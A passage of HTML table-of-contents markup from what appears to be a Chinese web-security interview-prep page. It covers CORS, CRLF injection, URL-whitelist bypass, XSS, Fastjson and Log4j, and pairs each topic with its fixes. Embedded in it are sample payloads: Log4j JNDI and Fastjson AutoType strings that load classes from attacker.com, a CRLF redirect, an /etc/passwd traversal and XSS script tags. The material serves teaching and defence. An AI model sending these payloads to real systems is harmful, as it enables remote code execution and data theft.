原理、利用及修复？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS-%E5%8E%9F%E7%90%86%EF%BC%9A%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%88CORS%EF%BC%89%E6%98%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%8C%E6%97%A8%E5%9C%A8%E9%99%90%E5%88%B6%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E8%B5%84%E6%BA%90%E5%8F%AF%E4%BB%A5%E8%A2%AB%E5%85%B6%E4%BB%96%E5%9F%9F%E7%9A%84%E7%BD%91%E9%A1%B5%E6%89%80%E8%AE%BF%E9%97%AE%E3%80%82%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8D%E5%85%81%E8%AE%B8%E4%BB%8E%E4%B8%8D%E5%90%8C%E6%BA%90%E5%8A%A0%E8%BD%BD%E8%B5%84%E6%BA%90%EF%BC%8C%E9%99%A4%E9%9D%9E%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%A8%E5%93%8D%E5%BA%94%E5%A4%B4%E4%B8%AD%E8%AE%BE%E7%BD%AE%E4%BA%86-Access-Control-Allow-Origin%EF%BC%8C%E6%8C%87%E5%AE%9A%E5%93%AA%E4%BA%9B%E5%9F%9F%E5%90%8D%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E8%AF%A5%E8%B5%84%E6%BA%90%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E7%BD%91%E9%A1%B5%EF%BC%8C%E8%AF%B1%E4%BD%BF%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%8C%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%AB%99%E7%82%B9%E7%9A%84-CORS-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%AA%83%E5%8F%96%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E3%80%82%E4%BE%8B%E5%A6%82%EF%BC%9A-%E6%94%BB%E5%87%BB%E8%80%85%E7%AB%99%E7%82%B9%E9%80%9A%E8%BF%87-%E8%AF%B7%E6%B1%82%E7%9B%AE%E6%A0%87%E7%AB%99%E7%82%B9%EF%BC%8C%E8%8B%A5%E7%9B%AE%E6%A0%87%E7%AB%99%E7%82%B9%E6%9C%AA%E6%AD%A3%E7%A1%AE%E9%85%8D%E7%BD%AE-CORS%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E7%AA%83%E5%8F%96%E6%95%B0%E6%8D%AE%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%85%8D%E7%BD%AE%E4%B8%A5%E6%A0%BC%E7%9A%84-CORS-%E7%AD%96%E7%95%A5%EF%BC%9A%EE%88%83%E5%8F%AA%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A%E7%9A%84%E6%9D%A5%E6%BA%90%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E8%B5%84%E6%BA%90%EF%BC%9A-%E4%BD%BF%E7%94%A8%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82%EF%BC%9A%EE%88%83%E5%90%AF%E7%94%A8-OPTIONS-%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%A1%AE%E4%BF%9D%E8%AF%B7%E6%B1%82%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E3%80%82"><span class="toc-number">6.</span> <span class="toc-text">CORS 原理：跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了 Access-Control-Allow-Origin，指定哪些域名可以访问该资源。利用方式：攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的 CORS 漏洞，窃取敏感数据。例如：- 攻击者站点通过 &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;target.com&#x2F;sensitive-data&quot;&gt; 请求目标站点，若目标站点未正确配置 CORS，攻击者可窃取数据。修复方案：- 配置严格的 CORS 策略：只允许特定的来源域名访问资源：  1Access-Control-Allow-Origin: https:&#x2F;&#x2F;trusted-site.com- 使用预检请求：启用 OPTIONS 请求，确保请求的安全性。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%EF%BC%9F"><span class="toc-number">6.1.</span> <span class="toc-text">CRLF 注入原理？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9ACRLF%EF%BC%88Carriage-Return-Line-Feed%EF%BC%89%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%94%9F%E5%9C%A8%E6%94%BB%E5%87%BB%E8%80%85%E5%90%91-HTTP-%E5%93%8D%E5%BA%94%E4%B8%AD%E6%8F%92%E5%85%A5%E9%9D%9E%E6%B3%95%E7%9A%84%E6%8D%A2%E8%A1%8C%E7%AC%A6-r-n%EF%BC%8C%E4%BB%A5%E7%A0%B4%E5%9D%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E5%93%8D%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%BD%B1%E5%93%8D-HTTP-%E5%A4%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E6%8F%92%E5%85%A5%E6%81%B6%E6%84%8F%E5%86%85%E5%AE%B9%EF%BC%8C%E5%A6%82%E6%B3%A8%E5%85%A5-HTTP-%E5%93%8D%E5%BA%94%E5%A4%B4%EF%BC%8C%E8%BF%9B%E8%A1%8C%E9%87%8D%E5%AE%9A%E5%90%91%E3%80%81%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89%E7%AD%89%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-HTTP-%E5%A4%B4%E6%B3%A8%E5%85%A5%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87-CRLF-%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%9C%A8%E5%93%8D%E5%BA%94%E4%B8%AD%E6%8F%92%E5%85%A5%E9%A2%9D%E5%A4%96%E7%9A%84%E5%A4%B4%E9%83%A8%EF%BC%8C%E4%BE%8B%E5%A6%82%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%EF%BC%9A%EE%88%83%E8%BF%87%E6%BB%A4%E6%89%80%E6%9C%89%E8%BE%93%E5%85%A5%EF%BC%8C%E9%98%B2%E6%AD%A2%E7%94%A8%E6%88%B7%E6%8F%90%E4%BA%A4%E9%9D%9E%E6%B3%95%E7%9A%84%E6%8D%A2%E8%A1%8C%E7%AC%A6%E6%88%96%E5%9B%9E%E8%BD%A6%E7%AC%A6%E3%80%82-HTTP-%E5%A4%B4%E8%A7%84%E8%8C%83%E5%8C%96%EF%BC%9A%EE%88%83%E7%A1%AE%E4%BF%9D%E6%89%80%E6%9C%89-HTTP-%E5%A4%B4%E9%81%B5%E5%BE%AA%E6%A0%87%E5%87%86%E6%A0%BC%E5%BC%8F%EF%BC%8C%E9%81%BF%E5%85%8D%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E5%AD%97%E7%AC%A6%E6%8F%92%E5%85%A5%E3%80%82"><span class="toc-number">7.</span> <span class="toc-text">漏洞原理：CRLF（Carriage Return Line Feed）注入漏洞发生在攻击者向 HTTP 响应中插入非法的换行符 \r\n，以破坏服务器对响应的处理，从而影响 HTTP 头的解析。攻击者可以插入恶意内容，如注入 HTTP 响应头，进行重定向、跨站脚本攻击（XSS）等。利用方式：- HTTP 头注入：攻击者可以通过 CRLF 注入，在响应中插入额外的头部，例如重定向：  1234HTTP&#x2F;1.1 200 OKContent-Type: text&#x2F;htmlSet-Cookie: sessionid&#x3D;malicious_value; path&#x3D;&#x2F;; HttpOnlyLocation: http:&#x2F;&#x2F;attacker.com&#x2F;malicious修复方案：- 输入验证：过滤所有输入，防止用户提交非法的换行符或回车符。- HTTP 头规范化：确保所有 HTTP 头遵循标准格式，避免不必要的字符插入。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-%E7%99%BD%E5%90%8D%E5%8D%95%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">7.1.</span> <span class="toc-text">URL 白名单如何绕过？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9AURL-%E7%99%BD%E5%90%8D%E5%8D%95%E5%B8%B8%E7%94%A8%E4%BA%8E%E9%99%90%E5%88%B6%E7%94%A8%E6%88%B7%E8%AF%B7%E6%B1%82%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%8F%AA%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A%E7%9A%84%E5%9F%9F%E5%90%8D%E6%88%96%E8%B7%AF%E5%BE%84%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9F%90%E4%BA%9B%E6%8A%80%E6%9C%AF%E7%BB%95%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%8C%E5%8F%91%E8%B5%B7%E6%81%B6%E6%84%8F%E8%AF%B7%E6%B1%82%E3%80%82%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E5%8C%85%E6%8B%AC%EF%BC%9A-%E4%BD%BF%E7%94%A8-URL-%E7%BC%96%E7%A0%81%EF%BC%9A%E5%A6%82-http-example-com-2F-2E-2E-2F%EF%BC%88%E9%80%9A%E8%BF%87-URL-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E8%B7%AF%E5%BE%84%E9%99%90%E5%88%B6%EF%BC%89%E3%80%82-%E4%BD%BF%E7%94%A8-localhost-%E6%88%96-127-0-0-1-%E5%9C%B0%E5%9D%80%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E8%B7%AF%E5%BE%84%E7%BB%95%E8%BF%87%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87-URL-%E7%BC%96%E7%A0%81%E6%88%96%E4%BD%BF%E7%94%A8-DNS-%E9%87%8D%E7%BB%91%E5%AE%9A%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9F%9F%E5%90%8D%E9%99%90%E5%88%B6%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E7%99%BD%E5%90%8D%E5%8D%95%E8%A7%84%E5%88%99%EF%BC%9A%EE%88%83%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9F%9F%E5%90%8D%E5%92%8C%E8%B7%AF%E5%BE%84%EF%BC%8C%E7%A1%AE%E4%BF%9D%E5%8F%AA%E5%85%81%E8%AE%B8%E6%98%8E%E7%A1%AE%E7%9A%84%E5%90%88%E6%B3%95%E5%9C%B0%E5%9D%80%E3%80%82-DNS-%E6%A3%80%E6%9F%A5%EF%BC%9A%EE%88%83%E9%AA%8C%E8%AF%81-URL-%E7%9A%84-DNS-%E8%A7%A3%E6%9E%90%E7%BB%93%E6%9E%9C%EF%BC%8C%E7%A1%AE%E4%BF%9D%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%84-IP-%E5%B1%9E%E4%BA%8E%E5%8F%AF%E4%BF%A1%E8%8C%83%E5%9B%B4%E3%80%82"><span class="toc-number">8.</span> <span class="toc-text">漏洞原理：URL 白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：- 使用 URL 编码：如 http:&#x2F;&#x2F;example.com%2F%2E%2E%2F（通过 URL 编码绕过路径限制）。- 使用 localhost 或 127.0.0.1 地址直接访问内网服务。利用方式：- 路径绕过：攻击者通过 URL 编码或使用 DNS 重绑定，绕过域名限制：  1http:&#x2F;&#x2F;trusted-site.com&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd修复方案：- 严格白名单规则：验证请求的域名和路径，确保只允许明确的合法地址。- DNS 检查：验证 URL 的 DNS 解析结果，确保目标地址的 IP 属于可信范围。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%EF%BC%9F"><span class="toc-number">8.1.</span> <span class="toc-text">XSS 如何实现？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%85%81%E8%AE%B8%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E5%B8%B8%E9%80%9A%E8%BF%87%E8%BE%93%E5%85%A5%E6%A1%86%E3%80%81URL-%E5%8F%82%E6%95%B0%E7%AD%89%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5-JavaScript-%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A7%E8%A1%8C%E4%B8%8D%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%9B%E8%80%8C%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%88%96%E5%8A%AB%E6%8C%81%E4%BC%9A%E8%AF%9D%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%B0%86%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%AD%98%E5%82%A8%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%EF%BC%8C%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E6%97%B6%E8%A7%A6%E5%8F%91%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%EF%BC%9A-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87-URL-%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E5%90%8E%E8%A7%A6%E5%8F%91%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81%EF%BC%9A%EE%88%83%E5%AF%B9%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E8%BF%9B%E8%A1%8C%E4%B8%A5%E6%A0%BC%E7%9A%84%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86%EF%BC%8C%E9%81%BF%E5%85%8D%E5%B0%86%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E7%9B%B4%E6%8E%A5%E6%8F%92%E5%85%A5%E9%A1%B5%E9%9D%A2%EF%BC%9A-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%88CSP%EF%BC%89%EF%BC%9A%EE%88%83%E4%BD%BF%E7%94%A8-Content-Security-Policy-%E5%93%8D%E5%BA%94%E5%A4%B4%EF%BC%8C%E9%99%90%E5%88%B6%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E8%84%9A%E6%9C%AC%E6%9D%A5%E6%BA%90%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">漏洞原理：跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL 参数等位置注入 JavaScript 代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。利用方式：- 存储型 XSS：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：  1&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;- 反射型 XSS：攻击者通过 URL 注入恶意脚本，用户点击后触发：  1http:&#x2F;&#x2F;target.com&#x2F;search?q&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;修复方案：- 输入输出编码：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：  1echo htmlspecialchars($user_input, ENT_QUOTES, &#39;UTF-8&#39;);- 内容安全策略（CSP）：使用 Content-Security-Policy 响应头，限制可执行的脚本来源：  1Content-Security-Policy: script-src &#39;self&#39; https:&#x2F;&#x2F;trusted-cdn.com;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E3%80%81Log4j-%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9F%E5%A6%82%E4%BD%95%E5%BA%95%E5%B1%82%E8%A7%A3%E5%86%B3%E8%AF%A5%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">9.1.</span> <span class="toc-text">Fastjson、Log4j 常见漏洞原理？如何底层解决该漏洞？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9AFastjson-%E6%98%AF%E4%B8%80%E4%B8%AA-JSON-%E5%A4%84%E7%90%86%E5%BA%93%EF%BC%8C%E6%9B%BE%E6%9A%B4%E9%9C%B2%E5%87%BA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F-JSON-%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%88%A9%E7%94%A8-Fastjson-%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82%E6%AD%A4%E6%BC%8F%E6%B4%9E%E8%A2%AB%E7%A7%B0%E4%B8%BA-AutoType-%E6%BC%8F%E6%B4%9E%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8-Fastjson-%E7%9A%84-AutoType-%E7%89%B9%E6%80%A7%EF%BC%8C%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-JSON-%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%A6%81%E7%94%A8-AutoType%EF%BC%9A%EE%88%83%E7%A6%81%E7%94%A8%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%EF%BC%8C%E9%81%BF%E5%85%8D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%81%B6%E6%84%8F%E7%B1%BB%E5%9E%8B%EF%BC%9A-Log4j-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9ALog4j-%E6%98%AF%E4%B8%80%E6%AC%BE%E6%B5%81%E8%A1%8C%E7%9A%84-Java-%E6%97%A5%E5%BF%97%E6%A1%86%E6%9E%B6%EF%BC%8C%E6%9B%BE%E5%9B%A0-JNDI-%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89%E6%BC%8F%E6%B4%9E%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8%E7%89%B9%E5%88%B6%E7%9A%84%E6%97%A5%E5%BF%97%E8%BE%93%E5%85%A5%EF%BC%8C%E9%80%9A%E8%BF%87-JNDI-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-JNDI-%E6%B3%A8%E5%85%A5%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91-Log4j-%E5%90%91%E8%BF%9C%E7%A8%8B-JNDI-%E6%9C%8D%E5%8A%A1%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E6%9B%B4%E6%96%B0-Log4j-%E7%89%88%E6%9C%AC%EF%BC%9A%EE%88%83%E7%AB%8B%E5%8D%B3%E5%8D%87%E7%BA%A7%E5%88%B0-Log4j-2-16-0-%E6%88%96%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%EF%BC%8C%E7%A6%81%E7%94%A8-JNDI-%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%E3%80%82-%E7%A6%81%E7%94%A8-JNDI%EF%BC%9A%EE%88%83%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE-Log4j-%E7%A6%81%E7%94%A8-JNDI-%E6%9F%A5%E6%89%BE%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">Fastjson 漏洞原理：Fastjson 是一个 JSON 处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意 JSON 数据，利用 Fastjson 的自动类型转换功能，执行任意代码。此漏洞被称为 AutoType 漏洞。利用方式：- 反序列化攻击：攻击者利用 Fastjson 的 AutoType 特性，发送恶意 JSON 数据，触发反序列化漏洞，从而执行恶意代码。  1{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;attacker.com&#x2F;malicious&quot;}修复方案：- 禁用 AutoType：禁用不必要的类型转换，避免反序列化恶意类型：  1ParserConfig.getGlobalInstance().setAutoTypeSupport(false);Log4j 漏洞原理：Log4j 是一款流行的 Java 日志框架，曾因 JNDI 查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过 JNDI 远程加载恶意类，从而执行代码。利用方式：- JNDI 注入：攻击者发送恶意日志数据，触发 Log4j 向远程 JNDI 服务加载恶意类：  1${jndi:ldap:&#x2F;&#x2F;attacker.com&#x2F;malicious}修复方案：- 更新 Log4j 版本：立即升级到 Log4j 2.16.0 或更高版本，禁用 JNDI 查找功能。- 禁用 JNDI：通过配置 Log4j 禁用 JNDI 查找：  1log4j2.formatMsgNoLookups&#x3D;true</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%85%B7%E4%BD%93%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">10.1.</span> <span class="toc-text">业务逻辑漏洞具体类型：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B%E8%B4%A6%E6%88%B7%E7%8A%B6%E6%80%81%E4%BC%9A%E5%AF%BC%E8%87%B4%E9%A2%84%E6%9C%9F%E5%A4%96%E7%9A%84%E9%A3%8E%E9%99%A9%EF%BC%9A"><span class="toc-number">10.2.</span> <span class="toc-text">哪些账户状态会导致预期外的风险：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E6%A0%87%E8%AF%86%E6%98%8E%E6%96%87%E4%BC%A0%E8%BE%93%E4%BC%9A%E5%AF%BC%E8%87%B4%E7%9A%84%E9%A3%8E%E9%99%A9%EF%BC%9A"><span class="toc-number">10.3.</span> <span class="toc-text">身份标识明文传输会导致的风险：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E8%A7%A6%E5%8F%91%E7%82%B9%E4%BC%9A%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">10.4.</span> <span class="toc-text">水平越权触发点会存在的位置：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">10.5.</span> <span class="toc-text">水平越权有哪几种检测方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%95%B0%E5%AD%97%E5%8A%A0%E5%87%8F%E9%81%8D%E5%8E%86%E6%88%96%E9%80%9A%E8%BF%87%E4%B8%A4%E4%B8%AA%E8%B4%A6%E5%8F%B7%E4%BA%92%E6%B5%8B%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BC%98%E5%8A%A3%E5%8A%BF%EF%BC%9A"><span class="toc-number">10.6.</span> <span class="toc-text">通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E5%8F%8A%E4%BF%AE%E5%A4%8D%EF%BC%9F-1"><span class="toc-number">10.7.</span> <span class="toc-text">CORS 原理、利用及修复？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%85%8D%E7%BD%AE%E4%B8%A5%E6%A0%BC%E7%9A%84CORS%E7%AD%96%E7%95%A5%EF%BC%8C%E4%BB%85%E5%85%81%E8%AE%B8%E4%BF%A1%E4%BB%BB%E7%9A%84%E6%BA%90%E8%AE%BF%E9%97%AE%E8%B5%84%E6%BA%90%E3%80%82-%E4%BD%BF%E7%94%A8%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82%EF%BC%88OPTIONS%E8%AF%B7%E6%B1%82%EF%BC%89%EF%BC%8C%E5%9C%A8%E5%AE%9E%E9%99%85%E8%AF%B7%E6%B1%82%E4%B9%8B%E5%89%8D%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%E3%80%82"><span class="toc-number">11.</span> <span class="toc-text">修复方案：- 配置严格的CORS策略，仅允许信任的源访问资源。- 使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 